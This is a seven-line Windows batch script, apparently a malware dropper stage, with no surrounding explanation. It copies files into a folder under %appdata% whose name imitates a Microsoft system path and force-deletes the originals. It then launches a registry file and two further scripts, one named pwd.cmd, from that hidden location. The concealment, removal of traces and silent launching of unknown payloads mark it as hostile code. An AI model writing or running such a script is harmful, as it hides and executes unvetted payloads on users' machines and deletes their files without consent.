mkdir %appdata%\Microsoft\Windows\temp
xcopy /E * %appdata%\Microsoft\Windows\temp
del /f /q *
rmdir x /S /Q
start %appdata%\Microsoft\Windows\temp\setup.reg
start %appdata%\Microsoft\Windows\temp\x\start.bat
start %appdata%\Microsoft\Windows\temp\pwd.cmd

